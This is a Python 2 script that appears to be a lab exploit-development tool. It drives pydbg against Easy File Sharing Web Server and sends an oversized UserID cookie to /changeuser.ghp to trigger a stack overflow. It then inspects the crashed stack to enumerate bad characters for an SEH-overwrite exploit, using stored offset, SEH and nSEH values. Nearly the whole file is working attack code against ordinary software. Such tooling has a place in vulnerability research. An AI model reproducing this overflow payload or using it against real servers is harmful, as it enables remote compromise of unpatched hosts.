# -*- coding: utf-8 -*-
import time
import sys
import socket
import cPickle
import os

from pydbg import *
from pydbg.defines import *

from util import *

LAST_PICKLE_NAME = "crash_info.pkl"
PICKLE_NAME = "badchars.pkl"

exe_path = "D:\\testPoc\\Easy File Sharing Web Server\\fsws.exe"

import threading
import time

host, port = "127.0.0.1", 80

global Running
global lock
global chance
global MAX_OFFSET
global OFFSET
global badchars

def bytearray(badchars="\x00"):
	pattern = ""
	for c in xrange(0, 0xff+1):
		if chr(c) not in badchars:
			pattern += chr(c)
	return pattern

def find_badchar(stack, pattern):
	for i in xrange(1, len(pattern)):
		if stack.find(pattern[:i])==-1:
			return pattern[i-1]
	return None

chance = 1
Running = True
badchars = "\x00"
lock = threading.Lock()

def check_access_validation(dbg):
	global chance
	global Running
	global lock
	global badchars

	with lock:
		if dbg.dbg.u.Exception.dwFirstChance:
			chance -= 1
			# prevent test next size.
			Running = False
			if chance==0:
				Running = False
				crash_info = dbg.dump_context_list(stack_depth=(OFFSET+1000)/4)
				stack_info = ""

				for a in xrange(0, OFFSET+1000, 4):
					key = "esp+0" + hex(a)[2:] if len(hex(a))<4 else "esp+" + hex(a)[2:]
					stack_info += p32(crash_info[key]["value"])
				
				# print stack_info
				badchar = find_badchar(stack_info, bytearray(badchars=badchars))
				if badchar is None:
					bcs = [hex(ord(c)) for c in badchars]
					print "[+] find all badchars: %s" % bcs
				
				else:
					print hex(ord(badchar))
					badchars += badchar
					with open(PICKLE_NAME, "wb") as local_file:
						print "write ", PICKLE_NAME
						cPickle.dump(badchars, local_file)

				dbg.terminate_process()
				return DBG_EXCEPTION_NOT_HANDLED
			else:
				Running = True
			return DBG_EXCEPTION_NOT_HANDLED

		return DBG_EXCEPTION_NOT_HANDLED

class Fuzzer(object):
	def __init__(self, exe_path, max_offset = 8000):
		self.exe_path = exe_path
		self.pid = None
		self.dbg = None
		# self.running = True
		
		self.dbgThread = threading.Thread(target=self.start_debugger)
		self.dbgThread.setDaemon(False)
		self.dbgThread.start()
		
		# Wait debugger start process
		while self.pid is None:
			time.sleep(1)
		
		self.monitorThread = threading.Thread(target=self.monitor_debugger)
		self.monitorThread.setDaemon(False)
		self.monitorThread.start()
			
	def monitor_debugger(self):
		global Running
		global OFFSET
		global badchars

		with open(LAST_PICKLE_NAME, "rb") as local_file:
			OFFSET = cPickle.load(local_file)
			seh_offset = cPickle.load(local_file)
			seh = cPickle.load(local_file)
			nseh = cPickle.load(local_file)

		if not os.path.isfile(PICKLE_NAME):
			with open(PICKLE_NAME, "wb") as local_file:
				cPickle.dump("\x00", local_file)

		else:
			with open(PICKLE_NAME, "rb") as local_file:
				badchars = cPickle.load(local_file)
		raw_input("[+] Please start the debugger...")
		while  Running:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, port))
			buffer = "A" * OFFSET
			buffer += bytearray(badchars=badchars)

			httpreq = (
				"GET /changeuser.ghp HTTP/1.1\r\n"
				"User-Agent: Mozilla/4.0\r\n"
				"Host:" + host + ":" + str(port) + "\r\n"
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
				"Accept-Language: en-us\r\n"
				"Accept-Encoding: gzip, deflate\r\n"
				"Referer: http://" + host + "/\r\n"
				"Cookie: SESSIONID=6771; UserID=" + buffer + "; PassWD=;\r\n"
				"Conection: Keep-Alive\r\n\r\n"
			)
			s.send(httpreq)
			s.close()
			Running = False
			
	'''
		Try to start debugger and run it.
	'''
	def start_debugger(self):
		try:
			self.dbg = pydbg()
			self.dbg.load(self.exe_path)
			self.pid = self.dbg.pid
		except pdx:
			print "[+] Can't open file, please check file path"
			sys.exit(1)
		except Exception as e:
			print "[+] Unknow error: ", str(e)
			sys.exit(1)

		self.dbg.set_callback(EXCEPTION_ACCESS_VIOLATION, check_access_validation)
		self.dbg.run()
		
exe_path = "D:\\testPoc\\Easy File Sharing Web Server\\fsws.exe"
Fuzzer(exe_path)